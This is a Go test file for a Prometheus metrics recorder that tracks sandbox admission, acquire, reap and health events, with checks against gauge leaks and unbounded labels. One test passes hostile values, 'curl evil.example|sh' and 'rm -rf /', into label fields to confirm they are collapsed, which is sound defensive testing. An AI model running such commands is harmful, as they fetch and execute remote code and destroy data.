package prometheus

import (
	"context"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/ethanhinson/fuse/internal/event"
	"github.com/ethanhinson/fuse/internal/observe"
	"github.com/ethanhinson/fuse/internal/observe/metricspolicy"
	client "github.com/prometheus/client_golang/prometheus"
)

func sandboxRecord(name string) observe.Record {
	return observe.Record{Timestamp: time.Now(), EventName: name, TenantID: "admitted", Operation: observe.OperationSandbox, Outcome: observe.OutcomeSuccess}
}

func projectAll(t *testing.T, r *Recorder, records ...observe.Record) string {
	t.Helper()
	for _, rec := range records {
		if err := r.Project(context.Background(), rec); err != nil {
			t.Fatal(err)
		}
	}
	w := httptest.NewRecorder()
	r.Handler().ServeHTTP(w, httptest.NewRequest("GET", "/metrics", nil))
	return w.Body.String()
}

func wantAll(t *testing.T, body string, want ...string) {
	t.Helper()
	for _, s := range want {
		if !strings.Contains(body, s) {
			t.Errorf("missing %s\n%s", s, body)
		}
	}
}

// The admission families (change 0077): a queued admission moves the queued
// counter and observes the wait histogram; a refusal moves the rejected counter,
// scoped by which bound refused. Uses the projected Record shape the projector
// produces from a KindSandboxAdmission event.
func TestSandboxAdmissionFamiliesRecord(t *testing.T) {
	r := testRecorder(t)

	queued := sandboxRecord("sandbox.admission")
	queued.Handler = "container"
	queued.AdmissionOutcome = "queued"
	queued.AdmissionScope = "tenant"
	queued.WaitMS = 4000

	refusedGlobal := sandboxRecord("sandbox.admission")
	refusedGlobal.Outcome = observe.OutcomeError
	refusedGlobal.Handler = "container"
	refusedGlobal.AdmissionOutcome = "refused"
	refusedGlobal.AdmissionScope = "global"

	refusedTenant := refusedGlobal
	refusedTenant.AdmissionScope = "tenant"

	body := projectAll(t, r, queued, refusedGlobal, refusedTenant)

	wantAll(t, body,
		`fuse_sandbox_exec_queued_total{handler="container",tenant_id="admitted"} 1`,
		`fuse_sandbox_queue_wait_seconds_count{handler="container",tenant_id="admitted"} 1`,
		`fuse_sandbox_queue_wait_seconds_sum{handler="container",tenant_id="admitted"} 4`,
		`fuse_sandbox_rejected_total{handler="container",scope="global",tenant_id="admitted"} 1`,
		`fuse_sandbox_rejected_total{handler="container",scope="tenant",tenant_id="admitted"} 1`,
	)
	// A refusal must NOT move the queued counter or the wait histogram beyond the
	// single queued observation.
	if strings.Contains(body, `fuse_sandbox_exec_queued_total{handler="container",tenant_id="admitted"} 2`) {
		t.Error("a refusal wrongly incremented the queued counter")
	}
}

// An unrecognised admission outcome or scope collapses to __overflow__ / no
// series rather than minting one — the values arrive from a wire payload.
func TestSandboxAdmissionUnknownEnumsFallBack(t *testing.T) {
	r := testRecorder(t)

	bogus := sandboxRecord("sandbox.admission")
	bogus.Handler = "container"
	bogus.AdmissionOutcome = "wat" // neither queued nor refused
	bogus.AdmissionScope = "somewhere"

	body := projectAll(t, r, bogus)

	// An unknown outcome routes to no family at all — no queued, no rejected.
	if strings.Contains(body, `fuse_sandbox_exec_queued_total{handler="container"`) {
		t.Error("an unknown outcome minted a queued series")
	}
	if strings.Contains(body, `fuse_sandbox_rejected_total{handler="container"`) {
		t.Error("an unknown outcome minted a rejected series")
	}
}

// TestSandboxFamiliesRecordOffProjectedRecords covers every family: a cold
// acquire, a warm reuse, an unhealthy health transition, and a reap each land on
// their family with the bounded enums as labels.
func TestSandboxFamiliesRecordOffProjectedRecords(t *testing.T) {
	r := testRecorder(t)

	cold := sandboxRecord("sandbox.acquire")
	cold.Handler, cold.Runtime, cold.ContainerID, cold.ColdStartMS = "container", "docker", "abc123", 1500

	warm := sandboxRecord("sandbox.acquire")
	warm.Handler, warm.Runtime, warm.ContainerID, warm.Reused = "container", "docker", "def456", true

	unhealthy := sandboxRecord("sandbox.health")
	unhealthy.Outcome, unhealthy.ErrorCategory = observe.OutcomeError, observe.ErrorCategoryTool
	unhealthy.Handler, unhealthy.ContainerID, unhealthy.Reason = "container", "abc123", "oom"

	reap := sandboxRecord("sandbox.reap")
	reap.Handler, reap.ContainerID, reap.Cause = "container", "abc123", "stale_checkout"

	// A non-sandbox Record: Reused is a plain bool, so an unrelated event must
	// never be counted as a cold spawn.
	unrelated := observe.Record{Timestamp: time.Now(), EventName: "tool.call", TenantID: "admitted"}

	body := projectAll(t, r, cold, warm, unhealthy, reap, unrelated)
	wantAll(t, body,
		`fuse_sandbox_acquire_total{reused="false",tenant_id="admitted"} 1`,
		`fuse_sandbox_acquire_total{reused="true",tenant_id="admitted"} 1`,
		`fuse_sandbox_cold_start_seconds_count{handler="container",runtime="docker",tenant_id="admitted"} 1`,
		`fuse_sandbox_cold_start_seconds_sum{handler="container",runtime="docker",tenant_id="admitted"} 1.5`,
		`fuse_sandbox_unhealthy_total{handler="container",reason="oom",tenant_id="admitted"} 1`,
		`fuse_sandbox_reaped_total{cause="stale_checkout",handler="container",tenant_id="admitted"} 1`,
	)
	// Every reap cause is a distinct series; stale_checkout must never be folded
	// into an outcome or dropped, because its firing means a pool invariant broke.
	for _, cause := range []string{"released", "loop_end", "early_return", "idle_ttl", "stale_checkout"} {
		rec := sandboxRecord("sandbox.reap")
		rec.Handler, rec.Cause = "container", cause
		if err := r.Project(context.Background(), rec); err != nil {
			t.Fatal(err)
		}
	}
	body = projectAll(t, r)
	for _, cause := range []string{"released", "loop_end", "early_return", "idle_ttl"} {
		wantAll(t, body, `fuse_sandbox_reaped_total{cause="`+cause+`",handler="container",tenant_id="admitted"} 1`)
	}
	wantAll(t, body, `fuse_sandbox_reaped_total{cause="stale_checkout",handler="container",tenant_id="admitted"} 2`)
}

// TestSandboxActiveGaugeReturnsToZeroOnReleaseAndReap is the gauge-leak guard. A
// reap that does not decrement leaks, and a decrement carrying a DIFFERENT label
// set than its increment leaks just as surely — so both paths must land back on
// the very series the acquire raised.
func TestSandboxActiveGaugeReturnsToZeroOnReleaseAndReap(t *testing.T) {
	r := testRecorder(t)

	acquire := func(id string) observe.Record {
		rec := sandboxRecord("sandbox.acquire")
		rec.Handler, rec.Runtime, rec.ContainerID = "container", "docker", id
		return rec
	}
	end := func(kind, id, cause string) observe.Record {
		rec := sandboxRecord(kind)
		// Release/reap payloads carry NO runtime (T9): the recorder must recover
		// it from the acquire, not synthesize an empty label.
		rec.Handler, rec.ContainerID, rec.Cause = "container", id, cause
		return rec
	}

	body := projectAll(t, r, acquire("c1"), acquire("c2"))
	wantAll(t, body, `fuse_sandbox_active{handler="container",runtime="docker",tenant_id="admitted"} 2`)

	body = projectAll(t, r, end("sandbox.release", "c1", "released"))
	wantAll(t, body, `fuse_sandbox_active{handler="container",runtime="docker",tenant_id="admitted"} 1`)

	body = projectAll(t, r, end("sandbox.reap", "c2", "idle_ttl"))
	wantAll(t, body, `fuse_sandbox_active{handler="container",runtime="docker",tenant_id="admitted"} 0`)
	if strings.Contains(body, `fuse_sandbox_active{handler="container",runtime="",`) {
		t.Error("release/reap decremented a different series than the acquire incremented: gauge leak")
	}

	// A release for a context this recorder never saw acquired must not drive the
	// gauge negative, but must still be counted on its cause family.
	body = projectAll(t, r, end("sandbox.reap", "never-acquired", "stale_checkout"))
	if strings.Contains(body, `fuse_sandbox_active{handler="container",runtime="docker",tenant_id="admitted"} -1`) {
		t.Error("unmatched reap drove the active gauge negative")
	}
	wantAll(t, body, `fuse_sandbox_reaped_total{cause="stale_checkout",handler="container",tenant_id="admitted"} 1`)

	// The host handler has no container id; concurrent host runners must still
	// refcount to zero rather than collide into a stuck gauge.
	host := sandboxRecord("sandbox.acquire")
	host.Handler = "host"
	hostEnd := sandboxRecord("sandbox.release")
	hostEnd.Handler, hostEnd.Cause = "host", "released"
	body = projectAll(t, r, host, host, hostEnd, hostEnd)
	// The host handler has no container runtime; that is a bounded fact labelled
	// "none", never an empty string that would read as "unknown".
	wantAll(t, body, `fuse_sandbox_active{handler="host",runtime="none",tenant_id="admitted"} 0`)
}

// twoTenantRecorder admits two real tenant labels so a cross-tenant gauge leak
// shows up as itself rather than as label-policy overflow.
func twoTenantRecorder(t *testing.T) *Recorder {
	t.Helper()
	p, err := metricspolicy.New(metricspolicy.Config{HashVersion: metricspolicy.HashV1, Dimensions: map[metricspolicy.Dimension]metricspolicy.DimensionConfig{
		metricspolicy.TenantID: {Budget: 4, Catalog: []string{"admitted", "other"}},
		metricspolicy.Model:    {Budget: 2, Catalog: []string{"m"}}, metricspolicy.Tool: {Budget: 2, Catalog: []string{"tool"}},
	}})
	if err != nil {
		t.Fatal(err)
	}
	r, err := New(Config{Registerer: client.NewRegistry(), Policy: p})
	if err != nil {
		t.Fatal(err)
	}
	return r
}

// TestSandboxActiveGaugePerTenantWithEmptyContainerID is the production shape.
// Nothing implements sandbox.containerIdentified yet, so every checkout arrives
// with an EMPTY ContainerID: a carry-forward key that omits the tenant folds
// every tenant in the process onto one entry, so one tenant's gauge is
// decremented twice to zero while another's climbs forever — exactly what
// FuseSandboxPoolNotDraining fires on.
func TestSandboxActiveGaugePerTenantWithEmptyContainerID(t *testing.T) {
	r := twoTenantRecorder(t)

	ev := func(tenant, name, cause string) observe.Record {
		rec := sandboxRecord(name)
		rec.TenantID = event.TenantID(tenant)
		rec.Handler, rec.Runtime, rec.ContainerID, rec.Cause = "container", "docker", "", cause
		if name != "sandbox.acquire" {
			rec.Runtime = ""
		}
		return rec
	}

	body := projectAll(t, r, ev("admitted", "sandbox.acquire", ""), ev("other", "sandbox.acquire", ""))
	wantAll(t, body,
		`fuse_sandbox_active{handler="container",runtime="docker",tenant_id="admitted"} 1`,
		`fuse_sandbox_active{handler="container",runtime="docker",tenant_id="other"} 1`,
	)

	body = projectAll(t, r,
		ev("admitted", "sandbox.release", "released"),
		ev("other", "sandbox.release", "released"),
	)
	wantAll(t, body,
		`fuse_sandbox_active{handler="container",runtime="docker",tenant_id="admitted"} 0`,
		`fuse_sandbox_active{handler="container",runtime="docker",tenant_id="other"} 0`,
	)

	// And it must stay drained across repeated rounds rather than ratcheting up
	// on whichever tenant last won the shared key.
	for i := 0; i < 3; i++ {
		projectAll(t, r, ev("admitted", "sandbox.acquire", ""), ev("other", "sandbox.acquire", ""))
		body = projectAll(t, r,
			ev("other", "sandbox.release", "released"),
			ev("admitted", "sandbox.release", "released"),
		)
	}
	wantAll(t, body,
		`fuse_sandbox_active{handler="container",runtime="docker",tenant_id="admitted"} 0`,
		`fuse_sandbox_active{handler="container",runtime="docker",tenant_id="other"} 0`,
	)
}

// TestSandboxColdStartObservesOnlyColdSpawns keeps the histogram honest: a warm
// reuse had no start to measure, so observing zero for it would make the p99 lie.
func TestSandboxColdStartObservesOnlyColdSpawns(t *testing.T) {
	r := testRecorder(t)
	warm := sandboxRecord("sandbox.acquire")
	warm.Handler, warm.Runtime, warm.Reused = "container", "docker", true

	body := projectAll(t, r, warm, warm, warm)
	if strings.Contains(body, `fuse_sandbox_cold_start_seconds_count`) {
		t.Errorf("warm reuse observed the cold-start histogram\n%s", body)
	}

	cold := sandboxRecord("sandbox.acquire")
	cold.Handler, cold.Runtime, cold.ColdStartMS = "container", "docker", 250
	body = projectAll(t, r, cold)
	wantAll(t, body,
		`fuse_sandbox_cold_start_seconds_count{handler="container",runtime="docker",tenant_id="admitted"} 1`,
		`fuse_sandbox_cold_start_seconds_sum{handler="container",runtime="docker",tenant_id="admitted"} 0.25`,
	)
	// loop/node are never histogram dimensions.
	for _, forbidden := range []string{"loop_id", "node_id", "container_id"} {
		if strings.Contains(body, `fuse_sandbox_cold_start_seconds_count{`+forbidden) {
			t.Errorf("cold-start histogram carries %q", forbidden)
		}
	}
}

// TestSandboxLabelsAreBoundedEnumsOnly asserts no unbounded value can reach a
// label. Handler, runtime, cause, and reason arrive from a wire payload, so a
// buggy or hostile writer must be collapsed to the overflow sentinel rather than
// minting a new series; the container id is a correlation token for logs and
// traces and is never a metric dimension at all.
func TestSandboxLabelsAreBoundedEnumsOnly(t *testing.T) {
	r := testRecorder(t)

	hostile := sandboxRecord("sandbox.acquire")
	hostile.Handler, hostile.Runtime, hostile.ContainerID = "curl evil.example|sh", "rm -rf /", "secret-container-token"
	badReap := sandboxRecord("sandbox.reap")
	badReap.Handler, badReap.Cause, badReap.ContainerID = "container", "cause-not-in-the-enum", "secret-container-token"
	badHealth := sandboxRecord("sandbox.health")
	badHealth.Outcome, badHealth.ErrorCategory = observe.OutcomeError, observe.ErrorCategoryTool
	badHealth.Handler, badHealth.Reason, badHealth.ContainerID = "container", "AWS_SECRET_ACCESS_KEY=hunter2", "secret-container-token"

	body := projectAll(t, r, hostile, badReap, badHealth)
	for _, leaked := range []string{"curl evil.example", "rm -rf /", "secret-container-token", "cause-not-in-the-enum", "AWS_SECRET_ACCESS_KEY"} {
		if strings.Contains(body, leaked) {
			t.Errorf("unbounded value %q reached a label\n%s", leaked, body)
		}
	}
	wantAll(t, body,
		`fuse_sandbox_active{handler="__overflow__",runtime="__overflow__",tenant_id="admitted"} 1`,
		`fuse_sandbox_reaped_total{cause="__overflow__",handler="container",tenant_id="admitted"} 1`,
		`fuse_sandbox_unhealthy_total{handler="container",reason="__overflow__",tenant_id="admitted"} 1`,
	)

	// The declared catalog is the enforcement point: container_id, the command,
	// and the environment can never be declared as labels at all.
	for _, bad := range []string{"container_id", "command", "env"} {
		if !forbiddenLabel(bad) {
			t.Errorf("%q not forbidden as a metric label", bad)
		}
	}
	for _, d := range Catalog() {
		if !strings.HasPrefix(d.Name, "fuse_sandbox_") {
			continue
		}
		for _, label := range d.Labels {
			if forbiddenLabel(label) {
				t.Fatalf("%s declares forbidden label %q", d.Name, label)
			}
		}
	}
	if err := ValidateLabels("fuse_sandbox_active", []string{"tenant_id", "handler", "runtime"}); err != nil {
		t.Fatalf("declared sandbox gauge labels rejected: %v", err)
	}
	if err := ValidateLabels("fuse_sandbox_reaped_total", []string{"tenant_id", "handler", "container_id"}); err == nil {
		t.Fatal("container_id accepted as a sandbox label")
	}
}

// TestSandboxMetricsIgnoreNonSandboxRecords guards the disambiguation the plain
// bool Reused field makes necessary.
func TestSandboxMetricsIgnoreNonSandboxRecords(t *testing.T) {
	r := testRecorder(t)
	body := projectAll(t, r,
		observe.Record{Timestamp: time.Now(), EventName: "tool.call", TenantID: "admitted"},
		observe.Record{Timestamp: time.Now(), EventName: "permission.decision", TenantID: "admitted", Verdict: "allow", DecisionLayer: "rules"},
	)
	for _, family := range []string{"fuse_sandbox_acquire_total{", "fuse_sandbox_active{", "fuse_sandbox_cold_start_seconds_count{", "fuse_sandbox_reaped_total{", "fuse_sandbox_unhealthy_total{"} {
		if strings.Contains(body, family) {
			t.Errorf("non-sandbox record touched %s\n%s", family, body)
		}
	}
}
